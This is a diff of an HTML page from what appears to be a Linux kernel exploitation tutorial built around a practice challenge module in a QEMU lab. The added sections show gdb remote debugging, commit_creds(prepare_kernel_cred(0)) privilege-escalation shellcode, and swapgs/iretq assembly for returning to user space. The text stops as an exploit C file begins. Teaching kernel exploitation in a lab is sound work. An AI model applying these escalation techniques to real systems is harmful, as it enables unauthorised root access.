@@ -30,6 +30,15 @@ popd
 </span><span style="color:#ae81ff"></span>    -s <span style="color:#ae81ff">\
 </span><span style="color:#ae81ff"></span>    -append <span style="color:#e6db74">&#34;console=ttyS0 nokaslr quiet&#34;</span>
 </code></pre></div><pre><code>~/pwnkernel $ ./launch.sh
+</code></pre><h2 id="debugging-the-kernel">Debugging the Kernel</h2>
+<pre><code>~/pwnkernel $ gdb ./linux-5.4/vmlinux 
+GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
+...
+
+pwndbg&gt; target remote :1234
+Remote debugging using :1234
+default_idle () at arch/x86/kernel/process.c:581
+...
 </code></pre><h2 id="practice-kernel-module">Practice Kernel Module</h2>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/kernel.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/module.h&gt;</span><span style="color:#75715e">
@@ -102,9 +111,29 @@ clean:
 / # id
 uid=0(root) gid=0
 / # insmod ./challenge.ko
-</code></pre><h2 id="returning-to-user-space">Returning to User-Space</h2>
-<p>&hellip;</p>
-<h2 id="exploit-development">Exploit Development</h2>
+</code></pre><h2 id="escalating-privileges">Escalating Privileges</h2>
+<pre><code>creds = prepare_kernel_cred(0);
+commit_creds(creds);
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rdi</span>
+<span style="color:#a6e22e">movabs</span> <span style="color:#66d9ef">rbx</span>, <span style="color:#66d9ef">prepare_kernel_cred</span>
+<span style="color:#a6e22e">call</span> <span style="color:#66d9ef">rbx</span>
+<span style="color:#a6e22e">movabs</span> <span style="color:#66d9ef">rbx</span>, <span style="color:#66d9ef">commit_creds</span>
+<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rax</span>
+<span style="color:#a6e22e">call</span> <span style="color:#66d9ef">rbx</span>
+</code></pre></div><h2 id="returning-to-user-space">Returning to User-Space</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">swapgs</span>
+<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r15</span>, <span style="color:#66d9ef">saved_ss</span>
+<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">r15</span>
+<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r15</span>, <span style="color:#66d9ef">saved_rsp</span>
+<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">r15</span>
+<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r15</span>, <span style="color:#66d9ef">saved_rflags</span>
+<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">r15</span>
+<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r15</span>, <span style="color:#66d9ef">saved_cs</span>
+<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">r15</span>
+<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r15</span>, <span style="color:#66d9ef">target_rip</span>
+<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">r15</span>
+<span style="color:#a6e22e">iretq</span>
+</code></pre></div><h2 id="exploit-development">Exploit Development</h2>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;assert.h&gt;</span><span style="color:#75715e">
